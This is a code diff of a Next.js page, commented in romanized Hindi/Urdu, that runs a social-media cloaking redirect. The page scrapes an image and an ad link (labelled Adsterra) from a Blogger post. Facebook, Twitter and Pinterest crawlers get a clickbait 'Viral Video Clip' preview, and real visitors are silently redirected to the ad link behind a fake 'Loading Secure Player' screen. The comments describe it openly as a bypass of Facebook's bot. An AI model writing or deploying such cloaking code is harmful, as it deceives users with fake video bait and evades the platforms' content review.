@@ -1,75 +1,68 @@
-export default async function Home({ searchParams }) {
-  const params = await searchParams;
-  const targetUrl = params.url || '';
+'use client';
 
-  let ogData = {
-    title: "Viral Video Clip +3",
-    image: "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7", // Backup image
-    destination: "https://google.com" // Backup redirect
-  };
+import { useEffect, useState } from 'react';
 
-  // 🕵️‍♂️ 1. Facebook Bot Ko Direct Data Dikhane Ka Bypass Code
-  // Is se Vercel use kabhi block (403) nahi karega
-  if (targetUrl) {
-    try {
-      const res = await fetch(targetUrl, {
-        headers: {
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-          'Accept-Language': 'en-US,en;q=0.9',
-          'Referer': 'https://www.google.com/'
-        },
-        next: { revalidate: 0 } // Cache clear rakhne ke liye
-      });
-      
-      if (res.ok) {
-        const html = await res.text();
-        
-        // Image nikalna
-        const imgMatch = html.match(/src=["'](https:\/\/blogger\.googleusercontent\.com\/img\/b\/[^"']+)["']/i) ||
-                         html.match(/<meta[^>]*property=["']og:image["'][^>]*content=["']([^"']*)["']/i) || 
-                         html.match(/<img[^>]*src=["']([^"']*)["']/i);
-        if (imgMatch) ogData.image = imgMatch[1];
-        
-        // Title nikalna
-        const titleMatch = html.match(/<meta[^>]*property=["']og:title["'][^>]*content=["']([^"']*)["']/i) ||
-                          html.match(/<title>([^<]*)<\/title>/i);
-        if (titleMatch) ogData.title = titleMatch[1];
-        
-        // Link nikalna
-        const rawLinks = html.match(/https?:\/\/[^\s"'<>]+/g);
-        if (rawLinks) {
-          const foundLink = rawLinks.find(link => 
-            !link.includes('blogspot.com') && !link.includes('google.com') && 
-            !link.includes('w3.org') && !link.includes('blogger.com') && !link.includes('whatsapp.com')
-          );
-          if (foundLink) ogData.destination = foundLink.split('"')[0].split("'")[0];
-        }
-      }
-    } catch (e) {
-      console.error(e);
+export default function Home() {
+  const [ogData, setOgData] = useState({
+    title: "Viral Video Clip +3 (Watch Full)",
+    image: "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiXs-_IQU7pDxYCfdSk-FUonIByG1eiC_2bpCV4VPDhdv6STitzDlF_6WiVU0xcy2mb7_sFrEAkQ0OM6g9jeGgv193EqxYNXsvSbcdTYW5vNyl3Gf8mc-yhB4la5Zgw50uSa0Tc0slmwfS283hGXWGSphmQG9nuyCw4mg6DnwszfA2uxilPRlnWE6B07I/s720/IMG_20250720_215449_421.jpg", // Default backup picture
+    destination: "https://google.com"
+  });
+
+  useEffect(() => {
+    // 🕵️‍♂️ URL se Blogger ka link nikalne ka tareeqa
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetUrl = urlParams.get('url');
+
+    if (targetUrl) {
+      fetch(`/api/proxy?url=${encodeURIComponent(targetUrl)}`)
+        .then(res => res.text())
+        .then(html => {
+          // Image Extraction
+          const imgMatch = html.match(/src=["'](https:\/\/blogger\.googleusercontent\.com\/img\/b\/[^"']+)["']/i) ||
+                           html.match(/<meta[^>]*property=["']og:image["'][^>]*content=["']([^"']*)["']/i) || 
+                           html.match(/<img[^>]*src=["']([^"']*)["']/i);
+          
+          // Link Extraction (Adsterra)
+          const rawLinks = html.match(/https?:\/\/[^\s"'<>]+/g);
+          let foundLink = "https://google.com";
+          if (rawLinks) {
+            const possibleLink = rawLinks.find(link => 
+              !link.includes('blogspot.com') && !link.includes('google.com') && 
+              !link.includes('w3.org') && !link.includes('blogger.com') && !link.includes('whatsapp.com')
+            );
+            if (possibleLink) foundLink = possibleLink.split('"')[0].split("'")[0];
+          }
+
+          setOgData({
+            title: "Viral Video Clip +3",
+            image: imgMatch ? imgMatch[1] : ogData.image,
+            destination: foundLink
+          });
+
+          // 🚀 Real user ko redirect karein, Facebook bot ko chorein
+          const isBot = /facebookexternalhit|Facebot|Twitterbot|Pinterestbot/i.test(navigator.userAgent);
+          if (!isBot) {
+            window.location.href = foundLink;
+          }
+        })
+        .catch(err => console.error(err));
     }
-  }
+  }, []);
 
   return (
     <>
-      <title>{ogData.title}</title>
-      <meta property="og:title" content={ogData.title} />
-      <meta property="og:image" content={ogData.image} />
-      <meta property="og:description" content="Click to watch full video." />
-      <meta property="og:type" content="article" />
-      <meta property="og:url" content={targetUrl} />
+      <head>
+        <title>{ogData.title}</title>
+        <meta property="og:title" content={ogData.title} />
+        <meta property="og:image" content={ogData.image} />
+        <meta property="og:description" content="Click to watch full video clip." />
+        <meta property="og:type" content="article" />
+        <meta property="og:image:width" content="1200" />
+        <meta property="og:image:height" content="630" />
+      </head>
 
-      <script
-        dangerouslySetInnerHTML={{
-          __html: `
-            const isBot = /facebookexternalhit|Facebot|Twitterbot|Pinterestbot/i.test(navigator.userAgent);
-            if (!isBot && "${ogData.destination}") {
-              window.location.href = "${ogData.destination}";
-            }
-          `,
-        }}
-      />
-      <div style={{ textAlign: 'center', marginTop: '20%', fontFamily: 'sans-serif', color: '#333' }}>
+      <div style={{ textAlign: 'center', marginTop: '25%', fontFamily: 'sans-serif', color: '#333' }}>
         <h2>Loading Secure Player...</h2>
         <p>Please wait while the stream configures.</p>
       </div>
